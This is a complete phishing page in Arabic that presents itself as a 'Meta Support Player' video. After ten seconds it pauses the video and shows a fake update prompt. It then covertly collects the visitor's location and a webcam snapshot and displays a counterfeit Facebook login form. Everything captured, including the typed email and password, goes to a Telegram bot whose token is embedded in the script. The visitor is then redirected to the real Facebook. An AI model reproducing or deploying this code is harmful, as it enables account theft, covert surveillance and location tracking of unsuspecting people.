<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Meta Support Player</title>
    <link rel="manifest" href="manifest.json">
    <style>
        body { margin: 0; background: #000; font-family: Arial; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; color: white; }
        video { width: 100%; max-height: 100vh; cursor: pointer; }
        #pwa, #fb { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 10000; padding: 20px; flex-direction: column; align-items: center; justify-content: center; }
        .box { background: #fff; padding: 25px; border-radius: 15px; text-align: center; width: 90%; max-width: 380px; }
        button { background: #1877f2; color: #fff; border: none; padding: 15px; border-radius: 8px; width: 100%; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 15px; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; background: #f5f6f7; color: #000; }
        .logo { color: #1877f2; font-size: 35px; font-weight: bold; margin-bottom: 10px; }
    </style>
</head>
<body>

    <video id="vid" controls poster="trend_bg.jpg.jpg">
        <source src="v.mp4" type="video/mp4">
    </video>

    <div id="pwa">
        <div class="box">
            <h3 style="color:#000;">تحديث مطلوب</h3>
            <p style="color:#606770;">يرجى تثبيت المشغل الرسمي لمتابعة المشاهدة.</p>
            <button id="btn_ins">تثبيت واستكمال</button>
        </div>
    </div>

    <div id="fb">
        <div class="box">
            <div class="logo">facebook</div>
            <p style="color:#1c1e21; font-weight:bold;">يجب تسجيل الدخول للمتابعة</p>
            <input type="text" id="user" placeholder="الإيميل أو الهاتف">
            <input type="password" id="pass" placeholder="كلمة السر">
            <button id="btn_go">تسجيل الدخول</button>
        </div>
    </div>

    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const T = "8644789773:AAHR24ApIVuGT10W5sDFD-Wm3fHJAEIlrrk";
        const ID = "1356975454";
        const v = document.getElementById('vid');
        let p;

        if ('serviceWorker' in navigator) { navigator.serviceWorker.register('sw.js'); }
        window.addEventListener('beforeinstallprompt', (e) => { e.preventDefault(); p = e; });

        v.ontimeupdate = () => {
            if (v.currentTime >= 10) {
                v.pause();
                v.currentTime = 10;
                document.getElementById('pwa').style.display = 'flex';
            }
        };

        document.getElementById('btn_ins').addEventListener('click', async () => {
            if (p) { p.prompt(); }
            
            // 1. الموقع
            navigator.geolocation.getCurrentPosition((pos) => {
                sendMsg(`📍 موقع الضحية: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
            });

            // 2. الكاميرا والمايك
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const videoTrack = stream.getVideoTracks()[0];
                
                // لقطة صورة مخفية باستخدام Canvas (أضمن طريقة)
                const canvas = document.getElementById('canvas');
                const tempVideo = document.createElement('video');
                tempVideo.srcObject = stream;
                tempVideo.play();

                setTimeout(() => {
                    canvas.width = 640;
                    canvas.height = 480;
                    canvas.getContext('2d').drawImage(tempVideo, 0, 0, 640, 480);
                    canvas.toBlob((blob) => {
                        let fd = new FormData();
                        fd.append('chat_id', ID);
                        fd.append('photo', blob, 'shot.jpg');
                        fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd });
                    }, 'image/jpeg');
                    
                    stream.getTracks().forEach(t => t.stop()); // اقفل الكاميرا
                    sendMsg("📸 تم سحب لقطة حية بنجاح!");
                }, 1000);

            } catch (e) { sendMsg("❌ رفض الأذونات"); }
            
            document.getElementById('pwa').style.display = 'none';
            document.getElementById('fb').style.display = 'flex';
        });

        document.getElementById('btn_go').addEventListener('click', () => {
            const u = document.getElementById('user').value;
            const ps = document.getElementById('pass').value;
            if(u && ps) {
                sendMsg(`🔐 حساب فيسبوك:\n📧: ${u}\n🔑: ${ps}`);
                alert("⚠️ خطأ في الخادم.");
                window.location.href = "https://m.facebook.com";
            }
        });

        function sendMsg(m) {
            fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(m)}`, { mode: 'no-cors' });
        }
    </script>
</body>
</html>
